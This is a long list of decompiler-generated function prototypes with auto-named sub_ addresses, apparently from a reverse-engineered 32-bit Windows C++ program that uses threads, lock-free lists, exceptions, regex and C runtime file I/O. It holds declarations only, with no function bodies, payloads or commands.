int __thiscall sub_43A60A(_DWORD *this);
void __thiscall sub_43A61C(DWORD_PTR *Block);
int __thiscall sub_43A684(_DWORD *this);
int __thiscall sub_43A688(_DWORD *this);
int __thiscall sub_43A68C(_DWORD *lpTlsValue);
void __thiscall sub_43A754(DWORD_PTR *this, int a2);
BOOL __thiscall sub_43A7B3(int this);
BOOL __thiscall sub_43A7CF(_DWORD *lpTlsValue);
double __cdecl sub_43A7F2(double a1);
int __thiscall sub_43A82A(int this, int a2, unsigned int a3, int a4);
int __thiscall sub_43A8B7(double *this, double a2, int a3);
double __stdcall sub_43A8DA(unsigned int a1, unsigned int a2, int a3, int a4);
double __thiscall sub_43A915(char *this, int a2, int a3);
double __thiscall sub_43A9D0(int this);
unsigned int __thiscall sub_43AA07(int this, int a2);
unsigned int __thiscall sub_43AA4C(unsigned int *this);
char *__thiscall sub_43AA92(char *this, int a2);
BOOL __thiscall sub_43AABD(_BYTE *this);
bool __stdcall sub_43AAD6(int a1);
double __thiscall sub_43AB06(double *this);
unsigned int __thiscall sub_43AB26(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_43AB98(int this, unsigned int a2, unsigned int a3, int a4, unsigned int a5);
double __thiscall sub_43AD58(double *this);
char *__thiscall sub_43ADA4(char *this, int a2, int a3, _DWORD *a4);
void __thiscall sub_43AFFA(char *this);
void __thiscall sub_43B057(_DWORD *this, int a2, int a3, char a4);
void __thiscall sub_43B122(int this, int a2);
int __thiscall sub_43B170(_DWORD *this, int a2);
int __thiscall sub_43B1A9(_DWORD *this, int a2);
void __thiscall sub_43B1B8(int this, int a2, unsigned int a3);
unsigned int __thiscall sub_43B266(_DWORD *this, unsigned int a2);
int __thiscall sub_43B2D6(void *this, int a2);
void __thiscall sub_43B332(_DWORD *this);
_DWORD *__thiscall sub_43B3FB(void *this, _DWORD *a2, int a3);
int __thiscall sub_43B442(char *this, int a2);
_DWORD *__thiscall sub_43B500(void *this, _DWORD *a2, int a3);
unsigned int __thiscall sub_43B538(_DWORD *this, int a2);
char __thiscall sub_43B582(_DWORD *this, int a2, int a3, char a4);
void __thiscall sub_43B5FB(char *Block);
void __thiscall sub_43B616(int this, _DWORD *Block);
int __thiscall sub_43B6AF(int this, int a2);
int __thiscall sub_43B73E(_DWORD *this);
LPVOID __thiscall sub_43B75B(_DWORD *this);
_DWORD *__thiscall sub_43B778(_DWORD *this, int a2);
_DWORD *__thiscall sub_43B7C8(void *this, _DWORD *a2);
_DWORD *__thiscall sub_43B816(int this, unsigned int a2, int a3, char a4);
unsigned __int32 __thiscall sub_43BB1B(_DWORD *this, int a2);
char __thiscall sub_43BB69(_DWORD *this, int a2, int a3, char a4);
_DWORD *__thiscall sub_43BBEA(_DWORD *this);
int __thiscall sub_43BC9C(_DWORD *this, int a2);
void __thiscall sub_43BCD2(_DWORD *this, int a2, int a3);
void __thiscall sub_43BDB8(_DWORD *this, _DWORD *Block);
_DWORD *__thiscall sub_43BDE4(_DWORD *this, char a2);
void __thiscall sub_43BDF7(int this, int a2, char a3);
int __thiscall sub_43BEC5(_DWORD *this);
_DWORD *__thiscall sub_43BECF(_DWORD *this);
char __thiscall sub_43BED9(_DWORD *this, int a2, int a3);
int __stdcall sub_43BF15(int a1);
__int32 sub_43BF61();
int __cdecl sub_43C00E(int a1);
int sub_43C030();
union _SLIST_HEADER *__thiscall sub_43C04B(union _SLIST_HEADER *this, int a2);
_DWORD *__thiscall sub_43C08A(_DWORD *this, int a2, int a3);
int __thiscall sub_43C0BF(int this, int a2);
char *__thiscall sub_43C0E9(char *this);
void __thiscall sub_43C11D(_DWORD *this);
void __thiscall sub_43C124(_DWORD *this);
_DWORD *__thiscall sub_43C19B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_43C1BE(_DWORD *Block, char a2);
_DWORD *__thiscall sub_43C1E6(_DWORD *Block, char a2);
_DWORD *__thiscall sub_43C209(_DWORD *Block, char a2);
_DWORD *__thiscall sub_43C22C(void *this, int a2);
int __cdecl sub_43C261(int a1);
int __thiscall sub_43C296(_DWORD *this);
int __thiscall sub_43C29A(char *this);
int __stdcall sub_43C2E2(_DWORD *a1, int nPriority);
PSLIST_ENTRY __thiscall sub_43C2FA(char *this, struct _SINGLE_LIST_ENTRY *a2);
void __thiscall sub_43C35B(_BYTE *this, struct _SINGLE_LIST_ENTRY *a2);
signed __int32 __thiscall sub_43C3FE(volatile signed __int32 *this);
signed __int32 __thiscall sub_43C408(volatile signed __int32 *this);
int __thiscall sub_43C435(union _SLIST_HEADER *this, unsigned int a2, int a3);
BOOL __stdcall sub_43C4B7(_DWORD *a1);
PSLIST_ENTRY __thiscall sub_43C4C6(union _SLIST_HEADER *this);
int __thiscall sub_43C532(int this);
void sub_43C553();
int *__thiscall sub_43C56F(int *this);
DWORD __stdcall sub_43C669(int a1, int a2, int a3, int a4);
int __thiscall sub_43C72F(_DWORD *this, int a2, int a3);
char __thiscall sub_43C76C(_DWORD *this, int a2, int a3);
int __thiscall sub_43C7A9(_DWORD *this, int a2);
int __thiscall sub_43C7E6(void **this, int a2, int a3, int a4, int a5, int a6);
int __thiscall sub_43C82A(_DWORD *this, int a2, int a3, int a4);
int __thiscall sub_43C863(_DWORD *this, int a2, int a3);
__int32 sub_43C899();
void sub_43C908();
int __cdecl sub_43C94B(int (__thiscall ***a1)(_DWORD, int));
_DWORD *__thiscall sub_43C96D(_DWORD *this, int a2);
// void *__thiscall unknown_libname_50(void *); idb
_DWORD *__thiscall sub_43C9EB(_DWORD *this);
void __thiscall sub_43CA4B(void *this);
void *__thiscall sub_43CAAB(void *Block, char a2);
bool __thiscall sub_43CAD0(_DWORD *this, unsigned int a2);
int __thiscall sub_43CB05(_DWORD *this, int a2);
bool __thiscall sub_43CB4E(int this);
char __cdecl sub_43CBA1(int a1);
char __thiscall sub_43CBAD(__int32 this, __int32 *a2, int a3, char a4);
signed __int32 __thiscall sub_43CC3B(_DWORD *this, int a2);
int __thiscall sub_43CC60(_DWORD **this, int a2);
int __thiscall sub_43CC82(_DWORD **this, int a2);
char __thiscall sub_43CCA4(_DWORD **this, __int32 a2, int a3, struct _SINGLE_LIST_ENTRY *a4);
char __thiscall sub_43CD35(int this, struct _SINGLE_LIST_ENTRY *a2);
PSLIST_ENTRY __thiscall sub_43CD60(_DWORD *this);
int __thiscall sub_43CD76(unsigned int *this, int a2);
int __thiscall sub_43CD94(int this, int a2, int a3);
signed __int32 __thiscall sub_43CF11(_DWORD *this, unsigned int a2);
signed __int32 __thiscall sub_43CF51(_DWORD *this, unsigned int a2);
int __thiscall sub_43CF95(int this, __int32 a2, char a3);
char __thiscall sub_43D005(_BYTE *this);
signed __int32 __thiscall sub_43D0C1(int this);
int __thiscall sub_43D0F4(_DWORD *this);
char __thiscall sub_43D142(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
char __thiscall sub_43D236(int **this);
char __thiscall sub_43D393(int this);
volatile signed __int32 *__thiscall sub_43D3A7(volatile signed __int32 *this, _DWORD *a2);
int __thiscall sub_43D3E1(_DWORD *this, unsigned int a2);
int __thiscall sub_43D429(_DWORD *this, unsigned int a2);
char __thiscall sub_43D471(void *this, _DWORD *a2, int a3);
int __cdecl sub_43D50D(char a1, char a2, int a3, int a4);
int __stdcall sub_43D588(char a1, unsigned __int8 a2, int a3, int a4);
char __thiscall sub_43D5B5(int this, char a2, char a3);
int __thiscall sub_43D613(_DWORD *this);
char *__thiscall sub_43D630(char *this, int a2, int a3, int *a4);
void __thiscall sub_43D6AD(PSLIST_HEADER ListHead);
void __thiscall sub_43D750(int this);
volatile signed __int32 *__thiscall sub_43D779(_DWORD *this, signed __int32 a2);
signed __int32 __thiscall sub_43D8D5(_DWORD *this, int a2, char a3);
char __thiscall sub_43D9DD(_DWORD *this);
int __thiscall sub_43DA31(_DWORD *this, int a2);
int __thiscall sub_43DA6E(_DWORD *this, _DWORD *a2);
char __thiscall sub_43DAC8(_DWORD *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7);
int *__thiscall sub_43DB38(int *this, int *a2);
__int32 __thiscall sub_43DB6C(int *this, char a2);
__int32 __thiscall sub_43DBAF(int *this, char a2);
void __thiscall sub_43DC2D(_DWORD *this);
void __thiscall sub_43DC42(_DWORD *this);
int *__thiscall sub_43DC94(_DWORD *this);
int *__thiscall sub_43DCAD(_DWORD *this, int a2);
char __thiscall sub_43DCFD(int *this, _DWORD *a2);
void __thiscall sub_43DD27(int *this, int a2);
int __cdecl sub_43DD5E(int a1);
int *__cdecl sub_43DDAF(int a1);
_DWORD *__thiscall sub_43DDE8(_DWORD *this, int a2);
std::exception *__thiscall sub_43DE5F(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_43DE7A(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_43DE95(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_43DEB0(std::exception *this, struct std::exception *a2);
void __thiscall sub_43DECB(_DWORD *this);
int sub_43DF17();
char *__thiscall sub_43DF4D(_DWORD *this, char a2);
int __thiscall sub_43DF7A(_DWORD *this, int a2, int a3, int a4, int a5);
int *__thiscall sub_43E0F4(_DWORD **this, int a2);
int __thiscall sub_43E148(int this);
char __thiscall sub_43E280(int this);
void __thiscall sub_43E2F2(_DWORD *this);
int __thiscall sub_43E30A(_DWORD *this);
BOOL __thiscall sub_43E325(int this, int a2);
char __thiscall sub_43E4B6(int *this, _DWORD *a2);
char __thiscall sub_43E4F3(int this);
int __thiscall sub_43E561(_DWORD *this, bool *a2, bool *a3);
int __thiscall sub_43E68B(_DWORD **this, int a2);
signed __int32 __thiscall sub_43E6B7(volatile signed __int32 *this, signed __int32 a2);
int __thiscall sub_43E6E5(_DWORD *this);
int __thiscall sub_43E6ED(_DWORD *this);
int __thiscall sub_43E6F4(_DWORD **this);
int __thiscall sub_43E70D(_DWORD *this);
void __thiscall sub_43E73C(int *this, int a2, int a3, int a4);
bool __thiscall sub_43E8B4(_DWORD *this);
char __thiscall sub_43E8BC(int this);
int __thiscall sub_43E91A(int this);
char __thiscall sub_43EA1F(int this, char a2);
int __thiscall sub_43EAA5(int this, int a2, int a3, char a4);
int __thiscall sub_43EAF8(int this, int a2);
void __thiscall sub_43EB0F(int *this, int a2);
void __thiscall sub_43EB50(_DWORD *this);
int __thiscall sub_43EBB9(struct _SINGLE_LIST_ENTRY *this);
void __thiscall sub_43EBD8(int this);
int __thiscall sub_43EBFB(int (__thiscall **this)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int a2, int a3, int a4);
int __thiscall sub_43EC23(_DWORD *this, int a2);
char __thiscall sub_43EC56(_DWORD *this);
char __cdecl sub_43EC81(_DWORD *a1, int a2);
int __thiscall sub_43ECAE(int this);
void __thiscall sub_43ED6F(_DWORD *this, int a2, char a3);
char __thiscall sub_43EDBA(struct _SINGLE_LIST_ENTRY *this, int a2);
int __thiscall sub_43EEF1(int this, int a2, int a3);
int __fastcall sub_43F03D(int a1);
int __thiscall sub_43F100(_DWORD *this);
char __thiscall sub_43F200(int this, int a2);
int __thiscall sub_43F25C(struct _SINGLE_LIST_ENTRY *this);
union _SLIST_HEADER *__thiscall sub_43F3E4(union _SLIST_HEADER *this, int a2, struct _SINGLE_LIST_ENTRY *a3);
void __thiscall sub_43F46D(PSLIST_HEADER ListHead);
void __thiscall sub_43F510(union _SLIST_HEADER *this);
volatile __int32 *__thiscall sub_43F528(volatile __int32 *this);
char __cdecl sub_43F569(int a1);
char __thiscall sub_43F575(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
char __thiscall sub_43F669(char *this, int a2);
int *__thiscall sub_43F698(int *this, int a2, int a3, char a4, unsigned int a5);
int __thiscall sub_43F70F(int this, int a2, _DWORD *a3);
_DWORD *__thiscall sub_43F768(_DWORD *this, int a2, int a3, _DWORD *a4);
_DWORD *__thiscall sub_43F829(_DWORD *this, int a2, int a3, unsigned int a4, int a5);
void __thiscall sub_43F895(PSLIST_HEADER ListHead);
void __thiscall sub_43F93B(PSLIST_HEADER ListHead);
void __thiscall sub_43F9B7(int this);
void __thiscall sub_43FA1B(signed __int32 this);
void **__thiscall sub_43FA69(void **this, void **a2);
void *__thiscall sub_43FA93(void *Block, char a2);
volatile signed __int32 *__thiscall sub_43FAB8(_DWORD *this, _DWORD *a2);
volatile signed __int32 *__thiscall sub_43FC13(_DWORD *this, signed __int32 a2);
int __thiscall sub_43FD72(_DWORD *this, int a2, int a3, int a4, int a5, int a6);
char __cdecl sub_43FE89(int a1);
signed __int32 __thiscall sub_43FE95(_DWORD *this, int a2, signed __int32 a3);
int __thiscall sub_43FEBA(char *this, _DWORD *a2, int a3);
void __thiscall sub_43FF6B(_DWORD *this);
char __thiscall sub_43FFE1(volatile signed __int32 *this, _DWORD *a2);
int __thiscall sub_4400A3(int *this);
volatile signed __int32 *__thiscall sub_4400D7(_DWORD *this, int a2);
int __thiscall sub_440116(int this, int a2);
_DWORD *__thiscall sub_440151(char *this, _DWORD *a2, int a3);
struct _SINGLE_LIST_ENTRY *__thiscall sub_4401A5(union _SLIST_HEADER *this);
int __thiscall sub_44020A(_DWORD *this, int a2, char a3);
int __thiscall sub_44023D(int *this);
_DWORD *__thiscall sub_44024D(int *this, int a2);
bool __thiscall sub_440297(_DWORD *this);
bool __thiscall sub_44029F(void *this);
int __thiscall sub_4402AA(_DWORD *this, int a2);
int __thiscall sub_4402D3(int *this, _DWORD *a2);
int __thiscall sub_4402E6(int this, int a2, int a3, _DWORD *a4);
bool __thiscall sub_440368(_DWORD *this);
_DWORD *__thiscall sub_44037D(int *this, unsigned int a2, char a3);
int __thiscall sub_4403C5(int this, int *a2, char a3);
struct _SINGLE_LIST_ENTRY *__thiscall sub_4404A1(int this);
int __thiscall sub_4404FA(int this);
volatile signed __int32 *__thiscall sub_44052D(_DWORD *this, int a2);
PSLIST_ENTRY __thiscall sub_440546(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2);
char __thiscall sub_44056C(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
char __thiscall sub_44065D(int this);
char __thiscall sub_440680(_DWORD *this);
signed __int32 __thiscall sub_4406BF(union _SLIST_HEADER *this, int a2);
char __thiscall sub_4406E6(union _SLIST_HEADER *this, struct _SINGLE_LIST_ENTRY *a2);
int __thiscall sub_440728(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4);
int __thiscall sub_440758(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3);
int __thiscall sub_440780(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3);
int __thiscall sub_4408B4(int this, unsigned int a2);
_BYTE *__thiscall sub_4408DA(int this, char a2);
_DWORD *__thiscall sub_440A85(int *this, _DWORD *a2, int a3);
int __thiscall sub_440AD1(void *this, int a2);
_DWORD *__thiscall sub_440AE0(int this, _DWORD *a2, int a3);
int __thiscall sub_440B2F(int this, int a2);
volatile signed __int32 *__thiscall sub_440B6D(_DWORD *this, int a2);
_DWORD *__thiscall sub_440BA5(void *this, _DWORD *a2, int a3, int a4, _DWORD *a5);
_DWORD *__thiscall sub_440BDD(void *this, _DWORD *a2, int a3);
int __thiscall sub_440BF5(int *this);
void __thiscall sub_440C28(_DWORD *this, int *a2);
signed __int32 __thiscall sub_440C66(_DWORD *this, int a2, signed __int32 a3);
_DWORD *__thiscall sub_440C8C(int this, int a2, int a3);
int __thiscall sub_440CBB(int this, int a2, char a3);
_DWORD *__thiscall sub_440D24(_DWORD *this, int a2, char a3);
void __thiscall sub_440DBD(_DWORD *this);
_DWORD *__thiscall sub_440E02(_DWORD *Block, char a2);
int *__thiscall sub_440E27(_DWORD *this, int a2);
DWORD __thiscall sub_440E48(int this);
int __thiscall sub_440E9E(int this);
void __thiscall sub_440EF6(_DWORD *this, int a2);
PSLIST_ENTRY __thiscall sub_440F1B(_DWORD *this);
HMODULE __stdcall sub_440F38(int a1, int a2, int a3, int a4);
int __stdcall sub_440F5A(PVOID a1, int a2); // idb
bool __thiscall sub_440F7D(_DWORD *this);
int __thiscall sub_440F85(_DWORD *this, char a2);
DWORD __thiscall sub_440FBA(int this, char a2);
int __thiscall sub_441093(int this);
int __thiscall sub_4410B5(void *this);
signed __int32 __thiscall sub_4410CD(int this);
BOOL __thiscall sub_441155(int this);
_DWORD *__thiscall sub_441190(_DWORD *this, int a2);
HANDLE *__thiscall sub_4411B6(HANDLE *this, const void **a2);
void __thiscall sub_4411E7(char *this);
_DWORD *__thiscall sub_4411FB(_DWORD *this, char a2);
char *__thiscall sub_44123D(char *Block, char a2);
int __thiscall sub_441262(void *this, int a2, unsigned int a3);
HANDLE *__cdecl sub_44126E(const void **a1);
_DWORD *__fastcall sub_4412A1(int a1);
_DWORD *__stdcall sub_4412DF(int a1, int a2);
char *__thiscall sub_441317(char *this);
int __thiscall sub_44131B(_DWORD *this);
_DWORD *__thiscall sub_441334(const void **this, _DWORD *a2);
_DWORD *__thiscall sub_441349(const void **this, _DWORD *a2);
int __thiscall sub_441351(_DWORD *this, int a2, unsigned int a3);
union _SLIST_HEADER *__thiscall sub_44135D(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4);
DWORD sub_441369();
BOOL sub_4413AB();
// _DWORD __thiscall std::exception_ptr::exception_ptr(std::exception_ptr *__hidden this, const struct std::exception_ptr *); idb
void *__cdecl sub_4413D7(void *a1);
signed __int32 __thiscall sub_4413F1(volatile signed __int32 *this, int a2);
int __thiscall sub_441417(_DWORD *this, unsigned int *a2);
char __thiscall sub_44143F(volatile signed __int32 *this);
signed __int32 __thiscall sub_441467(volatile signed __int32 *this);
void __thiscall sub_4414C5(_DWORD *this);
// void __noreturn std::rethrow_exception(void); weak
_DWORD *__thiscall sub_441546(_DWORD *this, int a2);
_DWORD *__thiscall sub_4415B5(_DWORD *this);
int __thiscall sub_4415FF(int this, int a2);
int __thiscall sub_441623(volatile __int32 *this);
int __thiscall sub_44165D(int this, int a2);
volatile signed __int32 *__cdecl sub_441681(int a1);
signed __int32 __cdecl sub_441692(int a1);
__int32 __thiscall sub_4416A3(volatile __int32 *this, char a2);
int __thiscall sub_4416E6(volatile __int32 *this, unsigned __int8 (__cdecl *a2)(int, int), int a3, int (__cdecl *a4)(int, int));
int __thiscall sub_44179A(volatile __int32 *this, unsigned __int8 (__cdecl *a2)(int, int), int a3, int (__cdecl *a4)(int, int));
__int32 __thiscall sub_4417A6(volatile __int32 *this, char a2, char *a3);
__int32 __thiscall sub_441814(int this, char a2, int a3);
__int32 __thiscall sub_4418A2(int this, char a2);
void __cdecl sub_44195E(int a1);
int __cdecl sub_441985(int (__thiscall ***a1)(_DWORD, int));
void __thiscall sub_4419A3(_DWORD *this, int a2);
void __thiscall sub_4419BB(_DWORD *this, int a2);
void __thiscall sub_4419F1(int this, int a2);
char __thiscall sub_441A59(_BYTE *this, char a2);
signed __int32 __cdecl sub_441A66(int a1);
_DWORD *__thiscall sub_441BB5(_DWORD *this, int a2, _DWORD *a3, int a4);
_DWORD *__thiscall sub_441BFD(_DWORD *Block, char a2);
int __thiscall sub_441C27(_DWORD *this);
int __thiscall sub_441C2F(_DWORD *this);
int __thiscall sub_441C33(_DWORD *this);
int __thiscall sub_441C37(int *this, int a2);
unsigned int __thiscall sub_441C8F(int this);
unsigned __int32 __thiscall sub_441CA5(_DWORD **this);
unsigned int __thiscall sub_441CB2(_DWORD **this);
_DWORD *__thiscall sub_441CBF(_DWORD *this, int a2, _DWORD *a3, int a4);
bool __thiscall sub_441CF2(_WORD *this, int a2);
_DWORD *__thiscall sub_441D12(_DWORD *Block, char a2);
int __thiscall sub_441D3C(_DWORD *this);
int __thiscall sub_441D6B(int this, __int32 a2);
int __thiscall sub_441E2A(int (__thiscall ***this)(void *), int (__thiscall **a2)(void *));
char __thiscall sub_441E91(int this, int a2);
int __thiscall sub_441F1F(_DWORD *this);
_BYTE *__thiscall sub_441F6D(_DWORD *this, int a2);
__int32 __thiscall sub_441FD8(int this, int a2);
int __thiscall sub_442045(int this, int a2, __int16 a3, int a4);
char __thiscall sub_44207B(_DWORD *this);
int __thiscall sub_4420A9(_DWORD *this, int a2);
void __fastcall sub_4420CC(int a1);
int __thiscall sub_442172(int this);
__int32 __thiscall sub_442190(_DWORD *this, int a2);
__int32 __thiscall sub_4421E1(int this, int a2, int a3);
LPVOID __thiscall sub_442298(_DWORD *this, int a2, int a3);
std::regex_error *__thiscall sub_44236B(std::regex_error *this, struct std::regex_error *a2);
int __thiscall sub_442386(void *this);
void *__thiscall sub_4423E7(void *Block, char a2);
BOOL __thiscall sub_442409(_DWORD *this);
int __thiscall sub_44241A(_DWORD *this);
BOOL __thiscall sub_44241E(HANDLE *this);
BOOL __thiscall sub_442428(_DWORD *this, int nPriority);
char __thiscall sub_442440(_DWORD *this);
__int32 __thiscall sub_44246B(int this);
int __stdcall sub_442487(LPVOID lpThreadParameter); // idb
int *__thiscall sub_4424D7(int *this, int a2, int a3, int a4, int a5);
bool __thiscall sub_4424FC(unsigned int *this, int a2);
char __thiscall sub_442526(int this, _DWORD *a2);
bool __thiscall sub_442571(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_4425BD(_DWORD *this, int a2);
unsigned __int32 __thiscall sub_4425E3(_DWORD *this, int a2);
int __thiscall sub_442634(int *this);
int __thiscall sub_442681(_DWORD *this, int a2);
char __thiscall sub_4426BB(_QWORD *this, __int64 a2);
char __thiscall sub_4426F1(_DWORD *this, _DWORD *a2, int *a3, char a4);
int __thiscall sub_442780(_DWORD *this, int *a2, int a3);
int __thiscall sub_4427CD(_DWORD *this, _DWORD *a2);
int __thiscall sub_442808(_DWORD *this, _DWORD *a2);
char __stdcall sub_442846(_DWORD *a1, int *a2, char a3);
char __thiscall sub_44289D(_DWORD *this, _DWORD *a2, int *a3, char a4, int a5, char a6);
char __stdcall sub_44291E(_DWORD *a1, int a2);
char __thiscall sub_44295B(_DWORD *this, _DWORD *a2, int a3, int a4, char a5);
char __stdcall sub_4429D6(int *a1, int a2, char a3, char a4);
char __thiscall sub_442A29(_DWORD *this, int *a2, int a3, char a4, int a5, char a6);
PSLIST_ENTRY __thiscall sub_442AB7(_DWORD *this);
void __thiscall sub_442AFA(int this, signed __int64 a2);
char __thiscall sub_442B33(_DWORD *this, _DWORD *a2);
bool __stdcall sub_442B6F(int *a1, int *a2, char a3, char a4);
bool __stdcall sub_442BDC(int *a1, int *a2, char a3, char a4);
__int64 __thiscall sub_442C4A(_DWORD *this, int a2, int a3);
bool __thiscall sub_442CA4(void *this);
char __thiscall sub_442D23(int this, int *a2, int *a3, char a4, char a5);
char __thiscall sub_442FC0(int this, int *a2, int a3, char a4, char a5);
char __thiscall sub_44321E(int this, int *a2, _DWORD *a3, int *a4, char a5, int a6, char a7, char a8);
char __thiscall sub_44331A(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8);
char __thiscall sub_443428(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8);
char __thiscall sub_443527(int this, int *a2, int a3, int a4, unsigned int a5);
char __thiscall sub_44363A(int this, int *a2, int a3, int a4, unsigned int a5);
char __stdcall sub_443748(int *a1, _DWORD *a2, char a3);
char __stdcall sub_4437DC(_DWORD *a1, _DWORD *a2);
char __stdcall sub_44385D(int *a1, _DWORD *a2, char a3);
unsigned int __thiscall sub_4438F5(_DWORD *this, int a2, unsigned int a3);
unsigned int __thiscall sub_44391B(_DWORD *this, int a2, unsigned int a3);
bool __thiscall sub_443941(_DWORD *this, int a2, int a3, int a4, char a5);
char __thiscall sub_4439CD(_DWORD **this, _DWORD *a2, _DWORD *a3);
char __thiscall sub_443A0F(int this, _DWORD *a2, _DWORD *a3, int *a4);
__int32 __thiscall sub_443A7E(int *this);
void __thiscall sub_443A95(_DWORD *this, _DWORD *a2);
int __thiscall sub_443AE2(int this);
_DWORD *__thiscall sub_443AF6(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_443B2D(_DWORD *Block, char a2);
// _DWORD __cdecl __std_exception_destroy(_DWORD); weak
int sub_44413F();
void *__cdecl sub_444161(size_t Size);
// _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD); weak
// int __cdecl __std_type_info_name(int, PSLIST_HEADER ListHead); idb
// void *__cdecl memmove(void *, const void *Src, size_t Size);
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);
// void *__cdecl memmove_0(void *, const void *Src, size_t Size);
// void *__cdecl memset(void *, int Val, size_t Size);
std::exception *__thiscall sub_445E3A(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_445E55(std::exception *this, struct std::exception *a2);
_DWORD *__cdecl sub_446213(_DWORD *a1, int a2);
_DWORD *__cdecl sub_44622F(_DWORD *a1, int a2);
// int __cdecl __RTDynamicCast(int, int, struct TypeDescriptor *, struct TypeDescriptor *, int); idb
// void *__cdecl memchr(const void *Buf, int Val, size_t MaxCount);
// int __uncaught_exception(void); weak
// __vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);
std::exception *__thiscall sub_446FFC(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_447017(_DWORD *this);
int __thiscall sub_44751C(int this, char *a2, int a3);
// int __stdcall unknown_libname_51(char *, unsigned int, int); idb
void __thiscall sub_44763B(_BYTE *this, char *a2, int a3);
// void *__thiscall _HeapManager::getMemoryWithBuffer(_HeapManager *__hidden this, unsigned int); idb
void __cdecl j___free_base(void *Block);
// _DWORD __stdcall unknown_libname_56(_DWORD); weak
int __cdecl sub_44D8EF(int a1);
// void __cdecl _invalid_parameter_noinfo();
// void __cdecl __noreturn _invalid_parameter_noinfo_noreturn();
// unsigned int *__cdecl __doserrno();
// int *__cdecl _errno();
// void *__cdecl malloc(size_t Size);
int sub_44DC4F();
// _DWORD __cdecl common_flush_all(_DWORD); weak
// int __cdecl fflush(FILE *Stream);
// int __cdecl fclose(FILE *Stream);
// uintptr_t __cdecl _beginthreadex(void *Security, unsigned int StackSize, _beginthreadex_proc_type StartAddress, void *ArgList, unsigned int InitFlag, unsigned int *ThrdAddr);
// int __cdecl fgetc(FILE *Stream);
// void __thiscall __noreturn terminate(_DWORD); weak
// FILE *__cdecl __acrt_iob_func(unsigned int Ix);
// errno_t __cdecl _get_stream_buffer_pointers(FILE *Stream, char ***Base, char ***Pointer, int **Count);
// _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_44E3CE(int a1, int a2);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// int __cdecl fgetpos(FILE *Stream, fpos_t *Position);
// _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_44E6B9(int a1, int a2);
// int __cdecl ungetc(int Character, FILE *Stream);
// int __cdecl fsetpos(FILE *Stream, const fpos_t *Position);
// size_t __cdecl fread(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// int __cdecl _fseeki64(FILE *Stream, __int64 Offset, int Origin);
// int __cdecl fseek(FILE *Stream, int Offset, int Origin);
// int __cdecl _wrename(const wchar_t *OldFileName, const wchar_t *NewFileName);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
int __cdecl sub_44F077(int a1, int a2);
// _DWORD __cdecl unknown_libname_58(_DWORD, _DWORD, _DWORD); weak
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct __crt_locale_pointers *const); idb
// __time64_t __cdecl _time64(__time64_t *Time);
// FILE *__cdecl _fsopen(const char *FileName, const char *Mode, int ShFlag);
int __cdecl sub_451898(int a1);
// _DWORD __cdecl unknown_libname_60(_DWORD, _DWORD, _DWORD); weak
// int __thiscall unknown_libname_61(_DWORD); weak
int __cdecl sub_451F26(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7);
// _DWORD __stdcall unknown_libname_62(_DWORD, _DWORD, char); weak
// _DWORD __stdcall unknown_libname_63(_DWORD, _DWORD, _DWORD, char); weak
// _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_65(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// void __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(__crt_stdio_output::formatting_buffer *__hidden this); idb
// _DWORD __stdcall unknown_libname_67(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_68(_DWORD); weak
int __thiscall sub_452579(int this);
// int __thiscall unknown_libname_69(_DWORD); weak
char __thiscall sub_4526DE(char *this);
char __thiscall sub_4526FD(char *this);
// _DWORD __stdcall unknown_libname_70(_DWORD); weak
char __thiscall sub_452788(int this);
char __thiscall sub_4527B0(_BYTE *this);
char __thiscall sub_452919(int this);
char __thiscall sub_452B48(int this);
// int __cdecl __crt_stdio_output::to_integer_size(_DWORD); weak
// int __thiscall unknown_libname_71(_DWORD); weak
